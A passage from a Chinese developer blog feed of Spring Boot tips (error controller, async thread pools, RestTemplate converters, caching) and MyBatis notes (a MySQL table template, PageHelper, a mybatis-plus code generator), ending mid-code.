class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GlobalNotFoundErrorController</span> <span class="keyword">implements</span> <span class="title">ErrorController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PATH = <span class="string">&quot;/error&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ErrorAttributes errorAttributes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GlobalNotFoundErrorController</span><span class="params">(ErrorAttributes errorAttributes)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.errorAttributes = errorAttributes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getErrorPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> PATH;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = PATH)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> WebResponse <span class="title">handle404Exception</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        WebResponse response = WebResponse.getResponse();</span><br><span class="line">        <span class="keyword">final</span> String requestURI = request.getRequestURI();</span><br><span class="line">        WebRequest webRequest = <span class="keyword">new</span> ServletWebRequest(request);</span><br><span class="line">        Map&lt;String, Object&gt; body = errorAttributes.getErrorAttributes(webRequest, <span class="keyword">true</span>);</span><br><span class="line">        log.error(<span class="string">&quot;没有找到请求地址: &#123;&#125;,异常返回结果: &#123;&#125;&quot;</span>, requestURI, body);</span><br><span class="line">        <span class="comment">/* int internalStatusCode = (int) body.get(&quot;active&quot;); */</span></span><br><span class="line">        body.remove(<span class="string">&quot;active&quot;</span>);</span><br><span class="line">        body.remove(<span class="string">&quot;timestamp&quot;</span>);</span><br><span class="line">        body.remove(<span class="string">&quot;message&quot;</span>);</span><br><span class="line"><span class="comment">//        HttpStatus active = getStatus(request);</span></span><br><span class="line">        response.fail(WebResponseCode.FAILED, body, requestURI);</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="springboot-异步-多线程处理-async"><a href="#springboot-异步-多线程处理-async" class="headerlink" title="springboot 异步/多线程处理 async"></a>springboot 异步/多线程处理 async</h2><h3 id="多线程的几个概念"><a href="#多线程的几个概念" class="headerlink" title="多线程的几个概念"></a>多线程的几个概念</h3><ul><li>coreSize 核心线程 ，这里设置为 <strong>8</strong></li><li>queueCapacity 当核心线程都在跑任务，还有多余的任务会存到此处，这里设置为 <strong>20</strong></li><li>maxSize 如果queueCapacity存满了，还有任务就会启动更多的线程，直到线程数达到maxPoolSize。如果还有任务，则根据拒绝策略进行处理。<br>，这里设置为 <strong>15</strong> ，超过将会按照<strong>拒绝策略</strong>进行处理</li><li>keepAlive 线程存活时间</li></ul><blockquote><p>所以以上的设置，保证了最大只有15个线程在跑任务</p></blockquote><ol><li>当线程数量&lt;8的时候，如果有新的线程需要执行，则以前的线程不会销毁重复利用，直到启动的线程达到8个的时候，才会重复利用核心线程</li><li>也就是说如果启动的线程是&lt;=28个，总运行这28的线程的一直是线程池中的8个核心线程交替执行这些线程。</li><li>当启动的线程&gt;28个，此时启动新的线程,直到总线程数量达到maxSize</li><li>当启动的运行总线程&gt; 15个的时候，此处会安装下面的拒绝策略进行处理线程</li></ol><p>拒绝策略如下：</p><ol><li>由任务调用线程执行   <code>new ThreadPoolExecutor.CallerRunsPolicy();</code></li><li>抛异常    <code>new ThreadPoolExecutor.AbortPolicy();</code></li><li>多余的直接抛弃   <code>new ThreadPoolExecutor.DiscardPolicy();</code></li><li>根据FIFO（先进先出）抛弃队列里任务  <code>new ThreadPoolExecutor.DiscardOldestPolicy();</code></li></ol><p>而跟进代码发现：<code>TaskExecutionAutoConfiguration</code>类实现了<code>ThreadPoolTaskExecutor</code> bean,我一直都是用的是<code>TaskExecutor</code>，直到最近我发现这个bean异步操作后不能返回异步的结果。<br>所以这里推荐的还是使用<code>ThreadPoolTaskExecutor</code> 和<code>AsyncTaskExecutor</code>,二者都可以返回多线程执行的结果。如下所示：</p><p><img src="./img/async-task.png" alt="async task"></p><p>::: warning 空闲的coreSize线程<br>空闲的线程不占用内存，参考文档：<a href="https://stackoverflow.com/questions/43795545/is-idle-thread-taking-cpu-execute-time-in-java-executors" target="_blank" rel="noopener">stackoverflow</a><br>:::</p><h3 id="ThreadPoolTaskExecutor-等待所有的线程执行完成-future-get"><a href="#ThreadPoolTaskExecutor-等待所有的线程执行完成-future-get" class="headerlink" title="ThreadPoolTaskExecutor 等待所有的线程执行完成 future.get()"></a>ThreadPoolTaskExecutor 等待所有的线程执行完成 <code>future.get()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AsyncService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ThreadPoolTaskExecutor taskExecutor;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">longTask</span><span class="params">()</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">        List&lt;ListenableFuture&lt;Integer&gt;&gt; alllist = Lists.newArrayList();</span><br><span class="line">        IntStream.range(<span class="number">0</span>, <span class="number">200</span>).forEach(intValue-&gt;&#123;</span><br><span class="line">            ListenableFuture&lt;Integer&gt; thread = taskExecutor.submitListenable(() -&gt; &#123;</span><br><span class="line">                String name = Thread.currentThread().getName();</span><br><span class="line">                log.info(<span class="string">&quot;线程： &#123;&#125;&quot;</span>, name);</span><br><span class="line">                Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line">                log.info(<span class="string">&quot;结束: &#123;&#125;&quot;</span>, name);</span><br><span class="line">                <span class="keyword">return</span> intValue;</span><br><span class="line">            &#125;);</span><br><span class="line">            alllist.add(thread);</span><br><span class="line">        &#125;);</span><br><span class="line">        log.info(<span class="string">&quot;Waiting for everything to finish...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (ListenableFuture&lt;Integer&gt; future : alllist) &#123;</span><br><span class="line">            <span class="comment">// 此处的get方法会等待该线程执行完成</span></span><br><span class="line">            Integer threadIndex = future.get();</span><br><span class="line">            log.info(<span class="string">&quot;thread: &#123;&#125;, is done: &#123;&#125;&quot;</span>, threadIndex, future.isDone());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Unit测试中ThreadPoolTaskExecutor中任务退出"><a href="#Unit测试中ThreadPoolTaskExecutor中任务退出" class="headerlink" title="Unit测试中ThreadPoolTaskExecutor中任务退出"></a>Unit测试中<code>ThreadPoolTaskExecutor</code>中任务退出</h2><blockquote><p>因为@Test中的主线程已经退出，所以其他的异步线程池不能继续进行。</p></blockquote><h2 id="springboot-jar-vs-tomcat-war"><a href="#springboot-jar-vs-tomcat-war" class="headerlink" title="springboot jar vs tomcat war"></a>springboot jar vs tomcat war</h2><p>Hence the famous:</p><blockquote><p>‘Make JAR, not WAR.’ — Josh Long</p></blockquote><h2 id="配置RestTemplate支持更多的数据类型转换"><a href="#配置RestTemplate支持更多的数据类型转换" class="headerlink" title="配置RestTemplate支持更多的数据类型转换"></a>配置<code>RestTemplate</code>支持更多的数据类型转换</h2><p>在请求http的时候，可能返回的不会是通常的json类型，就是application/json，这种方式我们采用springboot类型的RestTemplate会报错，找不到对应的ResponseType对应的转换器，所以下面的配置可以采用<code>MappingJackson2HttpMessageConverter</code>转换所有的数据类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">restTemplate</span><span class="params">(RestTemplateBuilder builder)</span> </span>&#123;</span><br><span class="line">      RestTemplate restTemplate = builder.build();</span><br><span class="line">      List&lt;HttpMessageConverter&lt;?&gt;&gt; messageConverters = restTemplate.getMessageConverters();</span><br><span class="line">      <span class="comment">//放到第一个,使得以前的配置不生效</span></span><br><span class="line">      MappingJackson2HttpMessageConverter jackson2HttpMessageConverter = <span class="keyword">new</span> MappingJackson2HttpMessageConverter();</span><br><span class="line">      jackson2HttpMessageConverter.setSupportedMediaTypes(Lists.newArrayList(</span><br><span class="line">              MediaType.APPLICATION_JSON,</span><br><span class="line">              MediaType.APPLICATION_JSON_UTF8,</span><br><span class="line">              <span class="comment">// 支持所有的返回JSON数据,数据类型可以反序列化：  Content-Type: text/javascript;charset=utf-8</span></span><br><span class="line">              <span class="comment">// 不再使用，因为可能会引起其他的意外问题，反序列化最好转为String.class,不要使用Map.class 或者List.class</span></span><br><span class="line">              MediaType.ALL</span><br><span class="line">      ));</span><br><span class="line">      jackson2HttpMessageConverter.setObjectMapper(JacksonUtils.getObjectMapper());</span><br><span class="line">      jackson2HttpMessageConverter.setPrettyPrint(<span class="keyword">false</span>);</span><br><span class="line">      messageConverters.removeIf(m -&gt; m.getClass().getName().equals(MappingJackson2HttpMessageConverter.class.getName()));</span><br><span class="line">      messageConverters.add(<span class="number">0</span>, jackson2HttpMessageConverter);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> restTemplate;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="springboot-application-yml配置integer变量"><a href="#springboot-application-yml配置integer变量" class="headerlink" title="springboot application.yml配置integer变量"></a>springboot application.yml配置integer变量</h2><p>参考： <a href="https://blog.csdn.net/blueheart20/article/details/81480864" target="_blank" rel="noopener">https://blog.csdn.net/blueheart20/article/details/81480864</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Failed to bind properties under &#39;dubbo.protocol.port&#39; to java.lang.Integer:</span><br><span class="line"></span><br><span class="line">    Property: dubbo.protocol.port</span><br><span class="line">    Value: (java.lang.Integer)$&#123;server.port&#125;</span><br><span class="line">    Origin: class path resource [application.yml]:136:11</span><br><span class="line">    Reason: failed to convert java.lang.String to java.lang.Integer</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这些变量字符在进行maven的<code>clean install</code>的时候回替换成对应的变量，可以通过执行maven的<code>clean install</code>命令后采用解压缩包打开对应的war查看<br>对应的<code>application.yml</code>中的配置，会发现里面的变量已经被替换。 在<code>pom.xml</code>中进行如下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;resources&gt;</span><br><span class="line">        &lt;resource&gt;</span><br><span class="line">            &lt;directory&gt;src&#x2F;main&#x2F;resources&lt;&#x2F;directory&gt;</span><br><span class="line">            &lt;filtering&gt;true&lt;&#x2F;filtering&gt;</span><br><span class="line">        &lt;&#x2F;resource&gt;</span><br><span class="line">&lt;&#x2F;resources&gt;</span><br></pre></td></tr></table></figure><h2 id="Cacheable注解"><a href="#Cacheable注解" class="headerlink" title="Cacheable注解"></a>Cacheable注解</h2><ul><li><p>org.springframework.cache.interceptor.CacheInterceptor</p></li><li><p>org.springframework.cache.interceptor.CacheInterceptor#invoke</p></li><li><p>org.springframework.cache.interceptor.CacheAspectSupport#execute(org.springframework.cache.interceptor.CacheOperationInvoker, java.lang.Object, java.lang.reflect.Method, java.lang.Object[])</p></li><li><p>org.springframework.cache.interceptor.CacheAspectSupport#execute(org.springframework.cache.interceptor.CacheOperationInvoker, java.lang.reflect.Method, org.springframework.cache.interceptor.CacheAspectSupport.CacheOperationContexts)</p></li></ul><p>核心代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (contexts.isSynchronized()) &#123;</span><br><span class="line"> CacheOperationContext context = contexts.get(CacheableOperation.class).iterator().next();</span><br><span class="line"> <span class="keyword">if</span> (isConditionPassing(context, CacheOperationExpressionEvaluator.NO_RESULT)) &#123;</span><br><span class="line">  Object key = generateKey(context, CacheOperationExpressionEvaluator.NO_RESULT);</span><br><span class="line">  Cache cache = context.getCaches().iterator().next();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> wrapCacheValue(method, cache.get(key, () -&gt; unwrapReturnValue(invokeOperation(invoker))));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (Cache.ValueRetrievalException ex) &#123;</span><br><span class="line">   <span class="comment">// The invoker wraps any Throwable in a ThrowableWrapper instance so we</span></span><br><span class="line">   <span class="comment">// can just make sure that one bubbles up the stack.</span></span><br><span class="line">   <span class="keyword">throw</span> (CacheOperationInvoker.ThrowableWrapper) ex.getCause();</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// No caching required, only call the underlying method</span></span><br><span class="line">  <span class="keyword">return</span> invokeOperation(invoker);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进入redis中的缓存获取：<code>org.springframework.data.redis.cache.RedisCache#get</code>,这个是redis与数据库封装的类，还有参考类: <code>org.springframework.cache.support.AbstractValueAdaptingCache#get(java.lang.Object)</code> 这个是redis的相关操作类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> &lt;T&gt; <span class="function">T <span class="title">get</span><span class="params">(Object key, Callable&lt;T&gt; valueLoader)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> ValueWrapper result = get(key);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (result != <span class="keyword">null</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (T) result.get();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> T value = valueFromLoader(key, valueLoader);</span><br><span class="line"> put(key, value);</span><br><span class="line"> <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;整理一些常用的spring技术问题&lt;/p&gt;
&lt;h2 id=&quot;如何定义一个统一的REST返回结果对象？&quot;&gt;&lt;a href=&quot;#如何定义一个统一的REST返回结果对象？&quot; class=&quot;headerlink&quot; title=&quot;如何定义一个统一的REST返回结果对象？&quot;&gt;&lt;/a&gt;如</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="spring" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/spring/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>mybatis问题整理</title>
    <link href="https://seniortesting.club/posts/rGBEkZBmgm/"/>
    <id>https://seniortesting.club/posts/rGBEkZBmgm/</id>
    <published>2021-03-26T12:35:26.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p>整理相关mybatis的问题</p><h2 id="通用MYSQL建表字段模板"><a href="#通用MYSQL建表字段模板" class="headerlink" title="通用MYSQL建表字段模板"></a>通用MYSQL建表字段模板</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">-- Set character set the client will use to send SQL statements to the server</span><br><span class="line">--</span><br><span class="line">SET NAMES &#39;utf8&#39;;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">--  创建新表的模板，所有的表创建需要已此为模板</span><br><span class="line">-- Create table 新表名称</span><br><span class="line">--</span><br><span class="line">CREATE TABLE 新表名称 (</span><br><span class="line">    -- 必须字段 id, uuid, active,version, gmt_create,gmt_modified, create_by, modified_by</span><br><span class="line">                      id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT &#39;主键&#39;,</span><br><span class="line">                      uuid varchar(500) NOT NULL COMMENT &#39;该记录唯一识别码，用于区别主键&#39;,</span><br><span class="line">    -- 其他的字段</span><br><span class="line"></span><br><span class="line">    -- 以下为必须添加的额外保留字段</span><br><span class="line">                      active tinyint(1) UNSIGNED NOT NULL DEFAULT 1 COMMENT &#39;对应该条记录是否可用，1可用，0不可用&#39;,</span><br><span class="line">                      version int(20) UNSIGNED NOT NULL COMMENT &#39;对应乐观锁的版本号&#39;,</span><br><span class="line">                      gmt_create datetime NOT NULL COMMENT &#39;对应记录的创建时间&#39;,</span><br><span class="line">                      gmt_modified datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#39;对应记录的修改时间&#39;,</span><br><span class="line">                      create_by varchar(250) NOT NULL COMMENT &#39;对应添加记录的人&#39;,</span><br><span class="line">                      modified_by varchar(250) NOT NULL COMMENT &#39;对应最后一次修改记录的&#39;,</span><br><span class="line">                      PRIMARY KEY (id)</span><br><span class="line">)</span><br><span class="line">    ENGINE &#x3D; INNODB,</span><br><span class="line">    CHARACTER SET utf8mb4,</span><br><span class="line">    COLLATE utf8mb4_general_ci,</span><br><span class="line">    COMMENT &#x3D; &#39;新表说明&#39;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="PageHelper-return-PageInfo-total-1"><a href="#PageHelper-return-PageInfo-total-1" class="headerlink" title="PageHelper return PageInfo total =-1"></a><code>PageHelper</code> return <code>PageInfo</code> total =-1</h2><blockquote><p>Found that the <code>PageInfo</code> always return the <code>total</code> field as -1, and the select count(*) sql not run</p></blockquote><ul><li>The reason is as below:</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pagehelper:</span></span><br><span class="line">  <span class="attr">default-count:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><ul><li>The sql used here is:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Page&lt;Object&gt; page = PageHelper.startPage(pageNum, pageSize);</span><br><span class="line">List&lt;PermissionActionResponse&gt; permissionActions = authMapper.getPermissionActions();</span><br><span class="line">PageInfo&lt;PermissionActionResponse&gt; pageInfo = <span class="keyword">new</span> PageInfo&lt;&gt;(permissionActions);</span><br></pre></td></tr></table></figure><h2 id="mybatis-plus-重要坑记录"><a href="#mybatis-plus-重要坑记录" class="headerlink" title="mybatis-plus 重要坑记录"></a>mybatis-plus 重要坑记录</h2><ul><li>数据库表的字段为数据库关键字，采用如下声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 关键字数据表： @TableName(&quot;[user]&quot;)</span><br><span class="line">2. 关键字数据表字段：  @TableField(&quot;&#96;desc&#96;&quot;)</span><br></pre></td></tr></table></figure><ul><li>配置 MapperScan 注解</li></ul><blockquote><p>提到需要写上<code>@MapperScan(&quot;com.baomidou.mybatisplus.samples.quickstart.mapper&quot;)</code>,可以在mapper类上采用注解<code>@Mapper</code>达到同样的效果</p></blockquote><p>参考代码： <a href="https://github.com/baomidou/mybatis-plus-samples/blob/master/mybatis-plus-sample-auto-fill-metainfo/src/main/java/com/baomidou/samples/metainfo/mapper/UserMapper.java" target="_blank" rel="noopener">github 代码段</a></p><p>– 注解 annotation</p><ol><li><code>@TableName</code></li><li><code>@TableId</code></li><li><code>@TableField</code></li><li><code>@Version</code></li></ol><ul><li>分页</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 不进行 count sql 优化，解决 MP 无法自动优化 SQL 问题，这时候你需要自己查询 count 部分</span><br><span class="line">  &#x2F;&#x2F; page.setOptimizeCountSql(false);</span><br><span class="line">  &#x2F;&#x2F; 当 total 为非 0 时(默认为 0),分页插件不会进行 count 查询</span><br><span class="line">  &#x2F;&#x2F; 要点!! 分页返回的对象与传入的对象是同一个</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>常见问题整理</li></ul><p><a href="https://mybatis.plus/guide/faq.html" target="_blank" rel="noopener">FAQ</a></p><ul><li>mybatis plus 详细配置产生实体类及其相关代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import cn.hutool.core.io.FileUtil;</span><br><span class="line">import cn.hutool.core.util.StrUtil;</span><br><span class="line">import com.baomidou.mybatisplus.annotation.DbType;</span><br><span class="line">import com.baomidou.mybatisplus.annotation.FieldFill;</span><br><span class="line">import com.baomidou.mybatisplus.annotation.IdType;</span><br><span class="line">import com.baomidou.mybatisplus.core.exceptions.MybatisPlusException;</span><br><span class="line">import com.baomidou.mybatisplus.generator.AutoGenerator;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.DataSourceConfig;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.GlobalConfig;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.PackageConfig;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.StrategyConfig;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.po.TableFill;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.rules.DateType;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;</span><br><span class="line">import com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;</span><br><span class="line">import com.google.common.collect.Lists;</span><br><span class="line"></span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class MybatisCodeGenerator &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static String scanner(String tip)&#123;</span><br><span class="line">        Scanner scanner &#x3D; new Scanner(System.in);</span><br><span class="line">        StringBuilder help &#x3D; new StringBuilder();</span><br><span class="line">        help.append(&quot;请输入: &quot;+tip+&quot;: &quot;);</span><br><span class="line">        System.out.println(help.toString());</span><br><span class="line">        if(scanner.hasNext())&#123;</span><br><span class="line">            String inputTip &#x3D; scanner.next();</span><br><span class="line">            if(StrUtil.isNotEmpty(inputTip))&#123;</span><br><span 